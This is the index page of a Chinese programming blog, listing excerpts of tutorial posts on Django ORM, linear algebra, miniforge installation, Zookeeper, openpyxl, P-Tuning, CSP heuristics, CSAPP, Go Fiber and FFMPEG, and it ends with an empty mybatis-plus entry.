<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta name="generator" content="Hugo 0.121.1">
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>菜鸟程序员博客</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="菜鸟程序员博客">
		<meta property="og:title" content="菜鸟程序员博客" />
<meta property="og:description" content="菜鸟程序员博客" />
<meta property="og:type" content="website" />
<meta property="og:url" content="https://cainiaoprogram.github.io/" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	
	<link rel="alternate" type="application/rss+xml" href="/index.xml" title="菜鸟程序员博客">

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="菜鸟程序员博客" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">菜鸟程序员博客</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main list" role="main">
	<article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9d7d47cb7479e32501ffcdfac92f1af2/" rel="bookmark">
			django学习:ORM实现数据库的连接、表的创建与增删改查
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1.ORM机制 Django 是一个流行的 Python Web 框架，它提供了一个强大的 ORM（对象关系映射）机制，用于管理应用程序和数据库之间的数据交互。
ORM 是一种编程技术，它将数据库表的结构和数据转换为面向对象的模型，使开发者能够使用类和对象的方式来操作数据库，而不需要直接编写 SQL 查询语句。这简化了开发过程，提高了代码的可读性和可维护性。
Django 的 ORM 提供了一系列的 API 和工具，让开发者能够轻松地进行数据库操作，包括创建、读取、更新和删除数据，以及执行复杂的查询操作。以下是 Django ORM 的一些主要特点和功能
2.数据表的创建
1.首先，在django的app下的models.py文件中创建一个类，这个类中的字段就是所要创建数据表的字段，例如：
2.执行如下指令：
python manage.py makemigrations python manage.py migrate 3.数据库变化
以上1.2步骤执行前：
以上1.2步骤执行后：
3.数据表的删除 ORM机制提供关于数据表的删除：只需将表所对应的类注释掉即可。
例如以上定义的app01_UserInfo注释以后：
再执行
python manage.py makemigrations python manage.py migrate 这样表就被删除了。
4.新增表中的数据项 以下例子为了方便调试，在不执行python manage.py makemigrations和python manage.py migrate的情况下也可以完成测试。
1.首先在views中导入models的相关内容：
2.在views中定义一个orm视图函数，当浏览器发起请求时，执行视图函数中的内容：
3.新增表中数据项的指定如下：类名 .objects.create(数据项)，如下所示：
UserInfo.objects.create(name="qingpeng", password="123456", age=26) 5.删除表中的数据项 例如：如下图对于表中id=2存在和id=1数据相同情况。
orm机制提供的删除指定如下：类名 .objects.filter(条件).delete()
# 删除id=2的重复数据项 UserInfo.objects.filter(id=2).delete() 再次查看数据表，可见id=2的数据被删除了！
此外，如果需要删除全部数据，应该使用all进行删除：类名.objects.all().delete()
# 删除全部数据 UserInfo.objects.all().delete() 删除全部数据项：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/9d7d47cb7479e32501ffcdfac92f1af2/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/00124d16d7b201f6caf8178900b753c2/" rel="bookmark">
			线性代数基础知识
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		计算机视觉一些算法中常会用到线性代数的一些知识，为了便于理解和快速回忆，博主这边对常用的一些知识点做下整理，主要来源于如下这本书籍。
1. 矩阵不仅仅是数字排列而已，不然也不会有那么大精力研究它。其可以表示一种映射
关于映射，变换的一些帖子可以参考如下的
仿射变换（AffineTransform）与仿射矩阵-CSDN博客
图像的仿射变换 - 知乎
https://www.cnblogs.com/bnuvincent/p/6691189.html
2. 矩阵即是映射
3. 矩阵的运算
4.矩阵的逆
5.行列式
. 行列式计算也可参考其它帖子
行列式10种计算方法！几何及线代必考知识点梳理！ - 知乎
线性代数行列式知识点总结
线代学习笔记（7）- 行列式 - 知乎
6. 逆矩阵的计算
求逆矩阵的三种方法
计算逆矩阵的三种方法_矩阵求逆公式-CSDN博客
7. 初等变换
矩阵的初等变换 - 知乎
百度安全验证
8. 线性方程组的解
高斯-若尔当消元法_百度百科
线性代数的学习和整理14: 线性方程组求解的3种方法，重点讲矩阵函数求解-CSDN博客
矩阵基础4-线性方程组详解 - 简书
齐次线性方程组_百度百科
https://jingyan.baidu.com/article/fec7a1e5cb631f1190b4e732.html
线代-3.非齐次线性方程组解法 - 知乎
齐次和非齐次线性方程组的解法(整理定稿)
9. 单射，满设，双射
10. 矩阵的秩
一些关于矩阵秩的总结 - 知乎
DAY46|线代『矩阵』核心考点：矩阵的秩
如何理解矩阵的「秩」？
解的关系所确定的系数矩阵秩的关系 - 知乎
11.2 齐次线性方程组的基础解系和通解 - 知乎
11. 特征值和特征向量
线性代数的本质(10)-特征值与特征向量 - 知乎
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/00124d16d7b201f6caf8178900b753c2/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/439199acf236b17cfc7f3233bc6f9c3b/" rel="bookmark">
			【笔记】Mac M1上miniforge3与tushare的安装
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Mac M1上从头安装了miniforge3与tushare。记录一下步骤。
起因是在自己的Mac M1上安装tushare报了这个错，正好环境时间比较长了，于是删除干净从头安装了一遍。
Building wheels for collected packages: lxml Building wheel for lxml (setup.py) ... error error: subprocess-exited-with-error × python setup.py bdist_wheel did not run successfully. │ exit code: 1 ╰─&gt; [121 lines of output] Building lxml version 5.0.0. 首先移除上一版miniforge，没有安装过miniforge的朋友请忽略这个步骤。 rm -rf $(conda info --base) https://blog.csdn.net/qq_39043714/article/details/125019041
2. 编辑~/.zshrc，删除conda相关的初始化脚本
vi ~/.zshrc 下载miniforge安装包至Downloads
https://github.com/conda-forge/miniforge安装 bash ~/Downloads/Miniforge3-MacOSX-arm64.sh 重新登录terminal初始化，并添加清华镜像加速包安装 conda config --add channels https://mirrors.tuna.tsinghua.edu.cn/anaconda/cloud/conda-forge/ conda config --add channels https://mirrors.tuna.tsinghua.edu.cn/anaconda/pkgs/free/ conda config --add channels https://mirrors.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/439199acf236b17cfc7f3233bc6f9c3b/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/70827c58fe289fb9e2471a30c2feca91/" rel="bookmark">
			Zookeeper 分布式服务协调治理框架介绍入门
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 为甚么需要Zookeeper一、Zookeeper 介绍1.1 介绍1.2 Zookeeper中的一些概念1.2.1 集群角色1.2.2 会话 session1.2.3 数据节点 Znode1.2.4 版本1.2.5 事件监听器 Watcher1.2.6 ACL 权限控制表(Access Control Lists) 二、 Zookeeper的系统模型2.1.1 ZNode节点2.1.2 ZNode的分类2.1.3 事务ID2.1.4 ZNode的状态信息2.1.5 Watcher 数据变更通知2.1.6 ACL 保障数据的安全 Zookeeper最主要的使用场景，是作为分布式系统的分布式协同服务
资料：
zookeeper官方文档 https://zookeeper.apache.org/doc/r3.7.0/zookeeperInternals.html#sc_consistency 其他：
3.5支持动态节点扩容，之前要么全部停止，要么一个一个停止更新zookeeper的核心 zab协议，是一个最终一致性的协议，因为除了主节点外其他节点都是异步写入的数据，客户端如果在未同步完成前读取数据，就有可能出现数据不一致。如果要保证强一致性，那么写入性能将大受影响。如过要保证最新的值，那么客户端API提供了sync()方法，读取节点数据前调用一下，节点就会和主节点进行最新的同步。 为甚么需要Zookeeper 分布式系统的信息传输不可靠可能导致信息不一致
分布式系统使用n个服务器组成集群，可以增强系统的计算能力，但是服务器之间的信息传输协调，依靠的是不可靠的网络传输。需要考虑网络延迟、中断、服务器之间的信息不对等等问题。所以需要通过某种方式，让每个服务器之间能够信息同步和共享。
让分布式系统信息同步和共享
方式1：通过网络进行信息共享 通过网络进行信息共享，每次有数据变动时直接通知给每台服务器。出现网络问题的话，可能就会数据不一致，并且后续加入的服务器无法得知之前的消息。**方式2：通过共享存储进行信息共享 **例如对于需要共享的数据，放在可以共享访问的数据库中，各个服务器定期主动拉取数据。方式2优化 对于需要共享的数据，放在所有服务器都能共享访问的地方。并且当数据发生改变时，主动通知关注的服务器，这样各个服务器都能第一时间获取到最新的数据。Zookeeper就是这种方式实现的对分布式系统的协调。 一、Zookeeper 介绍 1.1 介绍 zookeeper 是一个开源的**分布式协调服务，**是一个典型的分布式数据一致性的解决方案。实现了分布式数据的强一致性！基于Zookeeper可以实现数据发布/订阅，负载均衡、命名服务、集群管理、分布式锁、分布式队列等功能。
1.2 Zookeeper中的一些概念 1.2.1 集群角色 在通常的集群方式中，最典型的就是Master/Slave模式(主备) ，这种模式对能够处理写操作的机器称为Master通过异步复制获取最新数据的称为Slave机器。Zookeeper没有直接使用M/S模式，引入了Leader、Follower、Observer三种角色。Zookeeper集群中所有机器通过Leader选举，选出Leader、Leader能提供事务写入服务，其他节点则仅提供读取服务，并且负责转发客户端写入事务到Leader节点。Observer和Follower节点的区别就是，Observer节点不参与投票，也不参与选举。Observer类型节点可以提升选举和投票的效率。 1.2.2 会话 session Session指的是客户端会话，zookeeper使用的是基于TCP的自己实现的通信协议。会话指的就是客户端和服务端之间的一次TCP长连接的创建和销毁。客户端通过这个TCP长连接来和服务器保持有效的会话，也能向服务器发送请求接受响应，同时还能接受来自服务器的Watch事件。 1.2.3 数据节点 Znode 在分布式系统中，“节点”往往是指代一台机器，但是 Zookeeper中，节点可以指代构成集群的机器称为“机器节点”,另外往往指代zookeeper的一中数据模型的数据单元**，** 称为数据节点。Zookeeper 将所有数据存储在内存中，数据模型是一棵树 ZNode Tree，由斜杠 / 进行分割的路径，就是一个Znode，例如 /lock/app 。每个ZNode可以保存自己的数据内容，同时还会保存一系列属性信息。 1.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/70827c58fe289fb9e2471a30c2feca91/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e5d382cd5a4952d5503424e068c4da13/" rel="bookmark">
			使用 openpyxl 库读取 Excel 文件
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 使用 openpyxl 库来读取 Excel 文件中特定行和列的值:
通过 openpyxl.load_workbook() 函数加载 Excel 文件，
使用 worksheet.cell() 方法获取指定行和列的单元格，并返回其值
注：在运行代码之前确保已安装 openpyxl 库，并且输入正确的文件路径、行号和列号以读取正确的数据。
#!/usr/bin/env python # -*- coding: UTF-8 -*- import openpyxl def readexcel(file_path, row, column): # 打开excel文件 workbook = openpyxl.load_workbook(file_path) # 获取活动工作表（第一个工作表） worksheet = workbook.active # 读取指定的行和列 value = worksheet.cell(row=row, column=column).value return value url = "C:/Users/xxx/Desktop/测试用例.xlsx" va1 = readexcel(url, 5, 2) va2 = readexcel(url, 2, 3) print(va1) print(va2) 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/968e208ad69d38863fdbbdfdb52be6d0/" rel="bookmark">
			大语言模型LLM微调技术：P-Tuning
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1 引言 Bert时代，我们常做预训练模型微调（Fine-tuning），即根据不同下游任务，引入各种辅助任务loss和垂直领域数据，将其添加到预训练模型中，以便让模型更加适配下游任务的方式。每个下游任务都存下整个预训练模型的副本，并且推理必须在单独的批次中执行。
那么能不能将所有自然语言处理的任务转换为语言模型任务？就是所有任务都可以被统一建模，任务描述与任务输入视为语言模型的历史上下文，而输出则为语言模型需要预测的未来信息。
因此，Prompt新范式被提出，无需要fine-tune，让预训练模型直接适应下游任务。Prompt方式更加依赖先验，而 fine-tuning 更加依赖后验。
2 P-tuning P-tuning有两个版本：
论文GPT Understands, Too[2]中的Prompt tuning，在本文行文过程中称为P-tuning v1。 GitHub 代码：https://github.com/THUDM/P-tuning
P-Tuning v2在论文《P-Tuning v2: Prompt Tuning Can Be Comparable to Fine-tuning Universally Across Scales and Tasks》中提出。 GitHub代码：https://github.com/THUDM/P-tuning-v2
2.1 prefix-tuning 如果分析 P-tuning，那不得不提到prefix-tuning技术，相对于fine-tuning，在调节模型的过程中只优化一小段可学习的continuous task-specific vector（prefix）而不是整个模型的参数。
对于不同的任务和模型结构需要不同的prefix：
在autoregressive LM 前添加prefix获得：
在encoder和decoder之前添加prefixs获得：
2.2 P-tuning v1 主要结构是利用了一个prompt encoder（BiLSTM+MLP），将一些pseudo prompt先encode（离散token）再与input embedding进行拼接，同时利用LSTM进行 Reparamerization 加速训练，并引入少量自然语言提示的锚字符（Anchor，例如Britain）进一步提升效果。然后结合（capital，Britain）生成得到结果，再优化生成的encoder部分。
P-tuning v1有两个显著缺点：任务不通用和规模不通用
在一些复杂的自然语言理解NLU任务上效果很差，比如序列标注等；预训练模型的参数量不能小，仅在10B规模表现良好，而在稍小规模的模型（330M和2B）上表现不佳。
2.3 P-tuning v2 V2版本主要是基于P-tuning和prefix-tuning技术，引入Deep Prompt Encoding和Multi-task Learning等策略进行优化的。
仅精调0.1%参数量，在330M到10B不同参数规模LM模型上，均取得和Fine-tuning相比肩的性能：
将Prompt tuning技术首次拓展至序列标注等复杂的NLU任务上，而P-tuning(v1)在此任务上无法运作：
2.4 v1和v2框架对比： 可以看到右侧的p-tuning v2中，将continuous prompt加在序列前端，并且每一层都加入可训练的prompts。在左图v1模型中，只将prompt插入input embedding中，会导致可训练的参数被句子的长度所限制。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/968e208ad69d38863fdbbdfdb52be6d0/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/848da7476c04f60abffce905ff16f5c2/" rel="bookmark">
			修复移动硬盘显示盘符但打不开问题
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		问题： 移动硬盘显示盘符，但无法打开。点击属性不显示磁盘使用信息。
分析解决： 这是由于硬盘存在损坏导致的，可以通过系统自带的磁盘检查修复解决，而无需额外工具。
假设损坏的盘符是E，在命令行运行以下命令进行修复：
chkdsk E:/f
修复包括损坏的文件记录、索引等，最终几分钟后修复完成，显示如下：
然后查看硬盘恢复正常显示，能打开了。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c846cf8758224022fc93dd9cfbae1d6d/" rel="bookmark">
			约束满足问题简介
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		约束满足问题的定义 约束满足问题（Constraint Satisfying Problem, CSP）
– 由一个变量集合和一个约束集合定义；
– 每个变量都有一个非空可能值域；
– 每个约束指定了包含若干变量的一个子集内各变量的赋值范围。
例如： 地图染色问题， N-皇后问题。
CSP问题的解 CSP的一个状态(最终解)： 对一些或全部变量的赋值 • 一个不违反任何约束的对变量的赋值称为相容赋值或合法赋值。
• 对每个变量都进行赋值称为完全赋值。
• 一个（ 一组） 对变量的赋值， 若既是相容赋值又是完全赋值(即对每个变量都赋了值，且这组赋值是合法的)， 则这个（组） 赋值是CSP问题的解。
某些CSP问题要求问题的解能使目标函数最大化——约束优化。
• CSP问题常常可以可视化， 表示为约束图， 更直观地显示问题， 帮助思考问题的答案。
CSP问题的分类 根据变量的类型划分： 离散值域和连续值域。 变量—离散值域 有限值域， 如地图染色问题， 八皇后问题。
无限值域， 如整数集合或者字符串集合。
• 例如， 对于作业规划问题， 无法枚举所有可能取值，要使用约束语言 ( 线性约束 / 非线性约束 ) 描述 ， 如。
变量—连续值域 最著名的连续值域CSP是线性规划问题。
– 线性规划中的约束必须是构成一个凸多边形的一组线性不等式。
– 线性规划问题可以在变量个数的多项式时间内求解。
根据约束的类型划分： – 线性或非线性约束。
– 一元或多元约束。
• 一元约束： 只限制一个变量的取值
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/c846cf8758224022fc93dd9cfbae1d6d/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/95c6b0f49604eee6aec788c9370bdb44/" rel="bookmark">
			约束满足问题改进技术：基于变量和赋值次序的启发式
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		回溯搜索的通用算法的问题与改进思路 • 需改善无信息回溯搜索算法的性能。
• 通用改进方法的思路：
– 下一步该给哪个变量赋值， 按什么顺序给该变量赋值？
– 每步搜索应该做怎样的推理？ 当前变量的赋值会对其他未赋值变量产生什么约束， 怎样利用这种约束以提高效率。
– 当遇到某个失败的变量赋值时， 怎样避免同样的失败？ 就是说如何找到对这种失败起到关键作用的某个变量赋值。
下面介绍基于变量和赋值次序的启发式的三种方法。
MRV（最少剩余值） 启发式 由于随机的变量赋值排序难以产生高效率的搜索。
例如： 在WA=red且NT=green条件下选取SA赋值的可能(只能取blue)与Q能取到的赋值(可以取blue、red)的比为(1:2)， 并且一旦给定SA赋值以后， Q、 NSW和V的赋值只有一个选择。
因此， 应当选择合法取值最少的变量， 即最少剩余值(MRV)启发式，也称为最受约束变量启发式或失败优先启发式。
为失败优先启发式是因为它可以很快找到失败的变量， 从而引起搜索的剪枝， 避免更多导致同样失败的搜索。
最少约束值启发式 最少约束值启发式： 当赋值的变量有多个值选择时， 优先的值应是约束图中排除邻居变量的可选值最少的， 即优先选择为剩余变量的赋值留下最多选择的赋值。
例如， WA=red且NT=green时， 如果给Q赋值， 可以为blue或red， 而Q=blue的选择不好， 因为此时SA没有一个可选择的了。所以应该让Q=red，使得SA留下他最多的选择。
度启发式 度启发式： 选择涉及对其他未赋值变量的约束数量大（与其他变量关联最多） 的变量。
– 地图染色例子中， 度(SA)=5， 其他均为2或3。
– 实际上， 一旦选择了SA作为初始节点， 应用度启发式求解本问题， 则可以不经任何回溯就找到解。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a24aacbfed1dfc92794eee53f1cdf890/" rel="bookmark">
			NLP论文阅读记录 - 2021 | SimCLS：抽象概括对比学习的简单框架
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 前言0、论文摘要一、Introduction1.1目标问题1.2相关的尝试1.3本文贡献 二.相关工作2.1优势 三.本文方法——抽象概括的对比学习框架3.1 第一阶段：候选生成3.2 第二阶段：无参考评估3.3对比训练 四 实验效果4.1数据集4.2 对比模型4.3实施细节4.4评估指标4.5 实验结果4.6 细粒度分析4.6.1 实体级4.6.2 句子级 4.7 XSum 数据集的结果 五 总结 前言 SimCLS: A Simple Framework for Contrastive Learning of Abstractive Summarization（2106） code
0、论文摘要 在本文中，我们提出了一个概念上简单但经验上强大的抽象概括框架 SIMCLS，它可以通过将文本生成作为参考来弥合当前占主导地位的序列到序列学习框架所产生的学习目标和评估指标之间的差距-对比学习辅助的自由评估问题（即质量估计）。
实验结果表明，通过对现有顶级评分系统进行微小修改，SimCLS 可以大幅提高现有顶级模型的性能。特别是，在 CNN/DailyMail 数据集上，ROUGE-1 相对于 BART（Lewis 等人，2020）有 2.51 的绝对提升，比 PEGASUS（Zhang 等人，2020a）有 2.50 的绝对提升，将最先进的性能推向了新的水平。
一、Introduction 1.1目标问题 序列到序列（Seq2Seq）神经模型（Sutskever et al., 2014）已广泛用于语言生成任务，例如抽象摘要（Nallapati et al., 2016）和神经机器翻译（Wu et al., 2016） ）。虽然抽象模型（Lewis et al., 2020；Zhang et al., 2020a）在摘要任务中显示出巨大的潜力，但它们也面临着广泛认可的 Seq2Seq 模型训练的挑战。具体来说，Seq2Seq 模型通常在最大似然估计 (MLE) 框架下进行训练，并且在实践中，它们通常使用教师强制（Williams 和Zipser，1989）算法。这在目标函数和评估指标之间引入了差距，因为目标函数基于局部、令牌级预测，而评估指标（例如 ROUGE（Lin，2004））将比较黄金参考和系统之间的整体相似性输出。此外，在测试阶段，模型需要自回归生成输出，这意味着前面步骤中产生的误差将会累积。训练和测试之间的这种差距在之前的工作中被称为暴露偏差（Bengio et al.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/a24aacbfed1dfc92794eee53f1cdf890/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8f78d96e1b7c6345f9afc96292268a71/" rel="bookmark">
			【深入理解计算机系统 第三版 导读】第一章 计算机系统漫游
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		第一章 计算机系统漫游 文章目录 第一章 计算机系统漫游1.1. 信息就是位+上下文1.2. 程序被其他程序翻译成不同的格式1.3. 了解编译系统如何工作是大有益处的1.4. 处理器读并解释储存在内存中的指令1.4.1. 系统的硬件组成1.4.2. 运行hello程序 1.5. 高速缓存至关重要1.6. 存储设备形成层次结构1.7. 操作系统管理硬件1.7.1. 进程1.7.2. 线程1.7.3. 虚拟内存1.7.4. 文件 1.8. 系统之间利用网络通信1.9. 重要主题1.9.1. Amdahl定律1.9.2. 并发和并行1.9.3. 计算机系统中抽象的重要性 小结(原文) 本章节为《深入理解计算机系统》第三版的个人导读，参考B站up主-九曲阑干与深入理解计算机系统01——计算机系统漫游
1.1. 信息就是位+上下文 这一节讲述的基本思想是：系统中所有的信息——包括磁盘文件、内存中的程序、内存中存放的用户数据以及网络上传输的数据都是由一连串比特位表示的。区分不同数据对象的唯一方法就是我们读到这些数据对象时的上下文。比如在不同的上下文中，一个同样的字节序列可能表示一个整数、浮点数、字符串或者机器指令。
1.2. 程序被其他程序翻译成不同的格式 先导：hello.c程序的生命周期是从一个高级C语言程序开始的，这是由人编写的，机器不懂，所以必须将它翻译成一个可执行目标文件hello。
编译系统：预处理器、编译器、汇编器和链接器。过程如下所示：
预处理：将stdio.h内容插入编译器：将hello.i翻译成文本文件，它包含一个汇编语言程序。汇编器：将hello.s翻译成机器语言指令，存储在hello.o中，这是一个二进制文件。链接器：hello程序调用了printf函数，而printf在一个单独的printf.o中，所以链接器要将它们合并。 1.3. 了解编译系统如何工作是大有益处的 优化程序性能，理解链接时出现的错误，避免安全漏洞。
1.4. 处理器读并解释储存在内存中的指令 在上面，我们得到了hello可执行目标程序，接下来就要去shell执行它：linux&gt; ./hello
1.4.1. 系统的硬件组成 总线：总线就是电子管道，它携带信息字节并负责在各个部件之间传递。I/O设备：输入/输出(I/O)设备就是与外界联系的通道。上图中有键盘、鼠标、显示器、磁盘驱动器。主存：主存是一个临时存储设备，在处理器执行程序时，用来存放程序和程序处理的数据。处理器：也就是中央处理单元CPU，是解释执行在主存中指令的引擎。它的核心是一个大小为一个字节的存储设备(或寄存器)，称为程序计数器。下面是它的可能执行过程： 加载：从主存中复制一个字节或者一个字到寄存器，以覆盖寄存器原来的位置。存储：从寄存器复制一个字节或者一个字到主存的某个位置，以覆盖这个位置上原有的内容。操作：把两个寄存器的内容复制到ALU，ALU对这两个字做算术运算，并将结果存放到一个寄存器中，以覆盖该寄存器中原来的内容。跳转：从指令本身中抽取一个字，并将这个字复制到程序计数器(PC)中，以覆盖PC中原来的值。 1.4.2. 运行hello程序 用的图是上面的图。运行hello程序的过程：1.在shell中输入指令，shell会将你输入的逐一读入寄存器，再存放到内容中，也就是主存储器。2.当我们敲击回车时，shell知道已经结束输入，然后执行一系列命令来加载可执行的hello文件，这些指令会将文件从磁盘复制到内存(第六章会有新技术)。3.文件到了主存之后，处理器就开始执行main中的指令。这一些指令将“hello，world\n”从主存中复制到寄存器文件，再从寄存器文件中复制到显示设备。
1.5. 高速缓存至关重要 这一节将了运行一个程序要搬来搬去的很麻烦，所以要很快很快的存储设备。所以针对这个，引出了高速缓存存储器。如下图：
1.6. 存储设备形成层次结构 这一节就一个图，很容易看懂的：
1.7. 操作系统管理硬件 操作系统有两个基本功能：1.防止硬件被失控的应用程序滥用；2.向应用程序提供简单一致的机制来控制复杂而又通常大不相同的低级硬件设备。操作系统通过基本的抽象概念(进程，虚拟内存，文件)来实现这两种功能。
1.7.1. 进程 进程是对操作系统对一个正在运行的程序的一种抽象。在一个系统上可以同时运行多个进程，而每个进程都好像在独占地使用硬件。而并发运行，则是说一个进程地指令和另一个进程地指令是交错执行地。在大多数系统中，需要运行的进程总数是可以多于运行它们的CPU总数的。
1.7.2. 线程 尽管通常我们认为一个进程只有单一的控制流，但是在现代系统中，一个进程实际上可以由多个称为线程的执行单元组成，每个线程都运行在进程的上下文中，并共享同样的代码和全局数据。
1.7.3. 虚拟内存 第九章的内容。
1.7.4. 文件 文件就是字节序列，仅此而已。每个I/O设备，包括键盘，磁盘，显示器，网络等都可以看作为文件。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/8f78d96e1b7c6345f9afc96292268a71/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/102c87ff429fde5402978e63274b4502/" rel="bookmark">
			Go Lang Fiber介绍
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		利用GoLang Fiber进行高性能Web开发 在不断发展的Web开发世界中，选择合适的框架至关重要。速度、简洁性和强大的功能集是每个开发者都追求的品质。在使用Go构建Web应用时，“Fiber”作为一个强大且轻量级的框架在众多选择中脱颖而出。在这份全面的指南中，我们将介绍GoLang Fiber，涵盖其安装和设置，指导您创建一个基本的Fiber应用，并帮助您了解构成与Fiber进行Web开发旅程基础的项目结构。
GoLang Fiber简介 GoLang Fiber是一个现代的Web框架，用于在Go中构建高性能的Web应用程序。它被设计为最快的Web框架之一，并通过利用Go的并发性和底层控制来实现这一点。Fiber受到Express.js的启发，Express.js是JavaScript世界中流行的Web框架，它将Express的一些最佳思想带到了Go中，使开发者能够快速高效地创建Web应用。
使Fiber脱颖而出的一些关键功能包括：
极速性能：Fiber从头开始构建，旨在实现极高的速度。它被设计来处理高负载低延迟的情况，非常适合实时应用。轻量级：Fiber被设计为轻量级和简约。它不包括不必要的功能，因此您只需构建所需的应用程序。Express.js风格的路由：如果您熟悉Express.js，您会发现Fiber的路由语法非常相似且易于使用。中间件支持：Fiber支持中间件，这使您可以轻松地为应用程序添加认证、日志记录和请求解析等功能。错误处理：Fiber提供了清晰且健壮的错误处理机制，使您能够轻松识别和处理应用程序中的错误。WebSocket：如果您需要为应用程序添加实时通信，Fiber具有内置的WebSocket支持。项目结构：Fiber遵循直观的项目结构，使您能够轻松组织和扩展随着应用程序的增长。 安装和设置
开始使用Fiber很简单。要安装Fiber，您可以使用以下命令：
go get -u github.com/gofiber/fiber/v2 此命令会获取Fiber包及其依赖项，确保您已安装了最新版本。既然Fiber已安装完成，让我们设置一个基本的应用程序。
创建一个基本的Fiber应用程序 让我们构建一个简单的“Hello, Fiber!”网页应用程序，以了解Fiber的工作方式。首先，在您的终端中为项目创建一个新目录并导航至其中。
mkdir hello-fiber cd hello-fiber 现在，为您的Fiber应用程序创建一个Go文件。您可以使用您喜欢的代码编辑器。例如，创建一个名为“main.go”的文件，并添加以下代码：
package main import ( "github.com/gofiber/fiber/v2" ) func main() { app := fiber.New() app.Get("/", func(c *fiber.Ctx) error { return c.SendString("Hello, Fiber!") }) app.Listen(":3000") } 在此代码中，我们导入了Fiber包并使用 fiber.New() 创建了一个新的Fiber应用程序实例。然后，我们使用 app.Get() 定义了一个根URL(“/”)的路由。当请求发送到这个路由时，它会响应文本“Hello, Fiber!”
要运行您的Fiber应用程序，请使用以下命令：
go run main.go 您的Fiber应用程序将在 http://localhost:3000 上可用。当您在Web浏览器中访问它或通过API客户端访问时，您将看到“Hello, Fiber!”消息。
理解项目结构 良好组织的项目结构对于构建可维护和可扩展的应用程序至关重要。Fiber没有强制执行特定的结构，但它提供了建议，以帮助您有效地组织代码。
以下是Fiber应用程序的典型项目结构：
├── app/ │ ├── routes/ │ │ ├── routes.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/102c87ff429fde5402978e63274b4502/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9da0569901bbc75356766ba5e6cf5e95/" rel="bookmark">
			FFMPEG结构体分析：AVStream
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		AVStream是存储每一个视频/音频流信息的结构体
AVCodecContext *codec：指向该视频/音频流的AVCodecContext（它们是一一对应的关系）
【再次重复：每个AVStream中包含一个AVCodecContext 】
AVRational time_base：时基。
通过该值可以把PTS，DTS转化为真正的时间。
FFMPEG其他结构体中也有这个字段，但是根据我的经验，只有AVStream中的time_base是可用的。
视频中真正的时间怎么计算？ PTS*time_base=真正的时间
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7b5217fd2f8d47cba1acff7b72ece173/" rel="bookmark">
			最新-mybatis-plus 3.5分页插件配置
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
